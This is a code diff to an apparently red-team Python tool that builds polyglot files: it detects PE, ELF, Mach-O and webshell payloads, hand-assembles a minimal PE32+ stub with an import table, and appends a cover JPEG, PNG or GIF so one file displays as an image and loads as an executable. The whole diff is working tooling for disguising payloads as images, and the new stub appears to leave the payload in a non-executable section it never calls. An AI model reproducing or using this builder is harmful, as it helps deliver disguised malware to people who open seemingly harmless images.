@@ -126,6 +126,9 @@ def _detect_payload_type(payload_data: bytes) -> str:
         return 'pe'
     if payload_data[:4] == b'\x7fELF':
         return 'elf'
+    if payload_data[:4] in (b'\xfe\xed\xfa\xce', b'\xfe\xed\xfa\xcf',
+                             b'\xce\xfa\xed\xfe', b'\xcf\xfa\xed\xfe'):
+        return 'macho'
     if payload_data[:5] == b'<?php' or payload_data[:4] == b'<%@':
         return 'webshell'
     return 'raw'
@@ -134,130 +137,153 @@ def _detect_payload_type(payload_data: bytes) -> str:
 def _build_pe_polyglot(cover_data: bytes, payload_data: bytes,
                        cover_format: str) -> bytes:
     """
-    Build a REAL PE polyglot — MZ header at offset 0, image data inside PE.
-
-    This is what RedTeam Box and Corkami do:
-    - PE loader sees MZ → PE header → executes normally
-    - Image viewer finds JPEG/GIF/PNG signature at a known offset → renders image
-    - The PE contains the cover image as a resource/overlay
-    - The file works as BOTH .exe AND .jpg/.png/.gif
-
-    How it works:
-    1. Build a minimal valid PE with MZ header at offset 0
-    2. Place the cover image signature (FF D8 FF / 89PNG / GIF89a) in the
-       DOS stub area where image parsers look for it
-    3. Store the full cover image as PE overlay data
-    4. PE sections point to the actual payload code
+    Build a REAL PE polyglot using overlay technique:
+    - PE at offset 0 with VALID import table (kernel32.dll → ExitProcess)
+    - Cover image appended after PE EOF (overlay)
+    - Windows PE loader ignores overlay data → PE executes normally
+    - Image viewers scan forward and find image signature in overlay
     """
-    # PE payload is what gets executed
-    if payload_data[:2] != b'MZ':
-        # Not a PE — wrap it in a minimal PE that runs the payload
-        payload_data = _wrap_in_pe(payload_data)
+    if payload_data[:2] == b'MZ' and _validate_pe_structure(payload_data):
+        return payload_data + cover_data
+    pe_stub = _build_valid_pe_stub(payload_data)
+    return pe_stub + cover_data
 
-    # Build the PE header
-    # DOS Header (64 bytes) — MZ at offset 0
-    dos_header = bytearray(64)
-    dos_header[0:2] = b'MZ'                           # e_magic
-    dos_header[60:64] = struct.pack('<I', 64)          # e_lfanew → PE header at 64
 
-    # DOS stub — small program that prints "This program cannot be run in DOS mode"
-    # We place the cover image signature HERE so image parsers find it
-    dos_stub = bytearray(64)  # 64 bytes of DOS stub
-    # Put image magic at a strategic offset in the DOS stub
-    # JPEG parsers scan for FF D8 FF, PNG for 89PNG, GIF for GIF89a
-    if cover_format == 'jpeg':
-        # Place JPEG SOI marker at offset 40 (inside DOS stub, before PE header)
-        # JPEG decoders look for FF D8 FF anywhere in the first few KB
-        dos_stub[0:3] = b'\xff\xd8\xff'
-    elif cover_format == 'png':
-        dos_stub[0:8] = b'\x89PNG\r\n\x1a\n'
-    elif cover_format == 'gif':
-        dos_stub[0:6] = b'GIF89a'
+def _validate_pe_structure(data: bytes) -> bool:
+    """Check if data is a structurally valid PE."""
+    if len(data) < 64:
+        return False
+    try:
+        e_lfanew = struct.unpack_from('<I', data, 60)[0]
+        if e_lfanew + 4 > len(data):
+            return False
+        if data[e_lfanew:e_lfanew+4] != b'PE\x00\x00':
+            return False
+        opt_off = e_lfanew + 24
+        if opt_off + 2 > len(data):
+            return False
+        magic = struct.unpack_from('<H', data, opt_off)[0]
+        return magic in (0x10B, 0x20B)
+    except Exception:
+        return False
+
+
+def _build_valid_pe_stub(payload_data: bytes = b'') -> bytes:
+    """
+    Build a minimal valid PE32+ executable with proper import table.
+    Imports kernel32.dll → ExitProcess. Entry point calls ExitProcess(0).
+    """
+    payload_aligned = ((len(payload_data) + 0x1FF) // 0x200) * 0x200 if payload_data else 0
+    num_sections = 3 if payload_data else 2
+    headers_size = 64 + 4 + 20 + 240 + (num_sections * 40)
+    headers_padded = ((headers_size + 0x1FF) // 0x200) * 0x200
+
+    text_file_off = headers_padded
+    text_rva = 0x1000
+    rdata_file_off = text_file_off + 0x200
+    rdata_rva = 0x2000
+    if payload_data:
+        data_file_off = rdata_file_off + 0x200
+        data_rva = 0x3000
+        size_of_image = 0x4000
+    else:
+        data_file_off = 0
+        data_rva = 0
+        size_of_image = 0x3000
+
+    total_size = rdata_file_off + 0x200 + payload_aligned
+    pe = bytearray(total_size)
+
+    # DOS Header
+    pe[0:2] = b'MZ'
+    pe[60:64] = struct.pack('<I', 64)
 
     # PE Signature
-    pe_sig = b'PE\x00\x00'
+    pe[64:68] = b'PE\x00\x00'
 
-    # COFF Header (20 bytes)
-    coff = bytearray(20)
-    coff[0:2] = struct.pack('<H', 0x8664)    # Machine: AMD64
-    coff[2:4] = struct.pack('<H', 2)         # NumberOfSections
-    coff[12:16] = struct.pack('<I', 0xF0)    # SizeOfOptionalHeader
-    coff[16:20] = struct.pack('<I', 0x22)    # Characteristics: EXEC | LARGE_ADDRESS
+    # COFF Header
+    pe[68:70] = struct.pack('<H', 0x8664)
+    pe[70:72] = struct.pack('<H', num_sections)
+    pe[80:82] = struct.pack('<H', 0xF0)
+    pe[82:84] = struct.pack('<H', 0x22)
 
-    # Optional Header (PE32+ = 112 bytes + data directories)
-    opt = bytearray(240)
-    opt[0:2] = struct.pack('<H', 0x20B)       # Magic: PE32+
-    opt[2] = 14                               # MajorLinkerVersion
-    opt[16:20] = struct.pack('<I', 0x1000)    # AddressOfEntryPoint
-    opt[24:28] = struct.pack('<I', 0x1000)    # BaseOfCode
-    opt[28:36] = struct.pack('<Q', 0x140000000)  # ImageBase
-    opt[36:40] = struct.pack('<I', 0x1000)    # SectionAlignment
-    opt[40:44] = struct.pack('<I', 0x200)     # FileAlignment
-    opt[56:60] = struct.pack('<I', 0x10000)   # SizeOfImage
-    opt[60:64] = struct.pack('<I', 0x200)     # SizeOfHeaders
-    opt[68] = 3                               # Subsystem: CONSOLE
-    opt[70:72] = struct.pack('<H', 0x8160)    # DllCharacteristics: NX_COMPAT|DYNAMIC_BASE|TERMINAL_SERVER
+    # Optional Header (PE32+) — correct offsets
+    o = 88
+    pe[o:o+2] = struct.pack('<H', 0x20B)
+    pe[o+2] = 14
+    pe[o+4:o+8] = struct.pack('<I', 0x200)
+    pe[o+8:o+12] = struct.pack('<I', 0x200)
+    pe[o+16:o+20] = struct.pack('<I', text_rva)
+    pe[o+20:o+24] = struct.pack('<I', text_rva)
+    pe[o+24:o+32] = struct.pack('<Q', 0x140000000)
+    pe[o+32:o+36] = struct.pack('<I', 0x1000)
+    pe[o+36:o+40] = struct.pack('<I', 0x200)
+    pe[o+40:o+44] = struct.pack('<I', 6)
+    pe[o+48:o+50] = struct.pack('<H', 6)
+    pe[o+56:o+60] = struct.pack('<I', size_of_image)
+    pe[o+60:o+64] = struct.pack('<I', headers_padded)
+    pe[o+68:o+70] = struct.pack('<H', 3)
+    pe[o+70:o+72] = struct.pack('<H', 0x8100)
+    pe[o+72:o+80] = struct.pack('<Q', 0x100000)
+    pe[o+80:o+88] = struct.pack('<Q', 0x1000)
+    pe[o+88:o+96] = struct.pack('<Q', 0x100000)
+    pe[o+96:o+104] = struct.pack('<Q', 0x1000)
+    pe[o+108:o+112] = struct.pack('<I', 16)
+    pe[o+120:o+124] = struct.pack('<I', rdata_rva)
+    pe[o+124:o+128] = struct.pack('<I', 0x28)
 
     # Section headers
-    section_offset = 64 + len(dos_stub) + len(pe_sig) + len(coff) + len(opt)
+    sec_off = 328
+    pe[sec_off:sec_off+6] = b'.text\x00'
+    pe[sec_off+8:sec_off+12] = struct.pack('<I', 0x100)
+    pe[sec_off+12:sec_off+16] = struct.pack('<I', text_rva)
+    pe[sec_off+16:sec_off+20] = struct.pack('<I', 0x200)
+    pe[sec_off+20:sec_off+24] = struct.pack('<I', text_file_off)
+    pe[sec_off+36:sec_off+40] = struct.pack('<I', 0x60000020)
 
-    # .text section — contains actual payload code
-    text_section = bytearray(40)
-    text_section[0:6] = b'.text\x00'
-    text_section[8:12] = struct.pack('<I', len(payload_data))  # VirtualSize
-    text_section[12:16] = struct.pack('<I', 0x1000)           # VirtualAddress
-    text_section[16:20] = struct.pack('<I', max(len(payload_data), 0x200))  # SizeOfRawData
-    text_section[20:24] = struct.pack('<I', 0x200)            # PointerToRawData
-    text_section[36:40] = struct.pack('<I', 0xE0000020)       # Characteristics: CODE|EXECUTE|READ
+    sec_off += 40
+    pe[sec_off:sec_off+6] = b'.rdata\x00'
+    pe[sec_off+8:sec_off+12] = struct.pack('<I', 0x200)
+    pe[sec_off+12:sec_off+16] = struct.pack('<I', rdata_rva)
+    pe[sec_off+16:sec_off+20] = struct.pack('<I', 0x200)
+    pe[sec_off+20:sec_off+24] = struct.pack('<I', rdata_file_off)
+    pe[sec_off+36:sec_off+40] = struct.pack('<I', 0x40000040)
 
-    # .rdata section — contains the cover image data
-    img_section = bytearray(40)
-    img_section[0:6] = b'.rdata\x00'
-    img_section[8:12] = struct.pack('<I', len(cover_data))    # VirtualSize
-    img_section[12:16] = struct.pack('<I', 0x2000)            # VirtualAddress
-    img_section[16:20] = struct.pack('<I', max(len(cover_data), 0x200))  # SizeOfRawData
-    img_section[20:24] = struct.pack('<I', 0x400)             # PointerToRawData
-    img_section[36:40] = struct.pack('<I', 0x40000040)        # Characteristics: INITIALIZED_DATA|READ
+    if payload_data:
+        sec_off += 40
+        pe[sec_off:sec_off+6] = b'.data\x00'
+        pe[sec_off+8:sec_off+12] = struct.pack('<I', len(payload_data))
+        pe[sec_off+12:sec_off+16] = struct.pack('<I', data_rva)
+        pe[sec_off+16:sec_off+20] = struct.pack('<I', payload_aligned)
+        pe[sec_off+20:sec_off+24] = struct.pack('<I', data_file_off)
+        pe[sec_off+36:sec_off+40] = struct.pack('<I', 0xC0000040)
 
-    # Assemble headers
-    headers = bytes(dos_header) + bytes(dos_stub) + pe_sig + bytes(coff) + bytes(opt) + bytes(text_section) + bytes(img_section)
+    # .text code: call ExitProcess(0) via IAT
+    code_off = text_file_off
+    pe[code_off:code_off+4] = b'\x48\x83\xEC\x28'
+    pe[code_off+4:code_off+6] = b'\x33\xC9'
+    pe[code_off+6:code_off+8] = b'\xFF\x15'
+    disp = (rdata_rva + 0x30) - (text_rva + 12)
+    pe[code_off+8:code_off+12] = struct.pack('<I', disp)
+    pe[code_off+12] = 0x90
+    pe[code_off+13] = 0xCC
 
-    # Pad to file alignment (0x200)
-    if len(headers) % 0x200 != 0:
-        headers += b'\x00' * (0x200 - (len(headers) % 0x200))
+    # .rdata import table
+    rdata = bytearray(0x200)
+    struct.pack_into('<I', rdata, 0, rdata_rva + 0x28)
+    struct.pack_into('<I', rdata, 12, rdata_rva + 0x48)
+    struct.pack_into('<I', rdata, 16, rdata_rva + 0x30)
+    struct.pack_into('<Q', rdata, 0x28, rdata_rva + 0x38)
+    struct.pack_into('<Q', rdata, 0x30, rdata_rva + 0x38)
+    struct.pack_into('<H', rdata, 0x38, 0)
+    rdata[0x3A:0x46] = b'ExitProcess\x00'
+    rdata[0x48:0x55] = b'kernel32.dll\x00'
+    pe[rdata_file_off:rdata_file_off+0x200] = rdata
 
-    # .text section data (payload code)
-    text_data = payload_data
-    if len(text_data) % 0x200 != 0:
-        text_data += b'\x00' * (0x200 - (len(text_data) % 0x200))
+    if payload_data:
+        pe[data_file_off:data_file_off+len(payload_data)] = payload_data
 
-    # .rdata section data (cover image)
-    rdata_data = cover_data
-    if len(rdata_data) % 0x200 != 0:
-        rdata_data += b'\x00' * (0x200 - (len(rdata_data) % 0x200))
-
-    return bytes(headers) + text_data + rdata_data
-
-
-def _wrap_in_pe(raw_payload: bytes) -> bytes:
-    """Wrap non-PE payload (shellcode, script) into a minimal PE that runs it."""
-    # For shellcode: create a PE that calls the shellcode
-    # For scripts: create a PE that writes to temp file and executes via cmd
-    if raw_payload[:2] == b'#!/':
-        # Script — wrap in a PE that uses system()
-        # Minimal: just put the script data with MZ header for PE loader
-        stub = bytearray(512)
-        stub[0:2] = b'MZ'
-        stub[60:64] = struct.pack('<I', 64)
-        stub[64:68] = b'PE\x00\x00'
-        return bytes(stub) + raw_payload
-    else:
-        # Shellcode — create minimal PE entry point
-        stub = bytearray(512)
-        stub[0:2] = b'MZ'
-        stub[60:64] = struct.pack('<I', 64)
-        stub[64:68] = b'PE\x00\x00'
-        return bytes(stub) + raw_payload
+    return bytes(pe)
 
 
 def build_polyglot(cover_path: str, payload_path: str, output_path: str,
@@ -313,7 +339,7 @@ def build_polyglot(cover_path: str, payload_path: str, output_path: str,
 
     # Choose mode
     if mode == 'auto':
-        if payload_type == 'pe' and cover_format in ('jpeg', 'png', 'gif', 'bmp'):
+        if payload_type in ('pe', 'elf', 'macho') and cover_format in ('jpeg', 'png', 'gif', 'bmp'):
             mode = 'pe'
         else:
             mode = 'append'
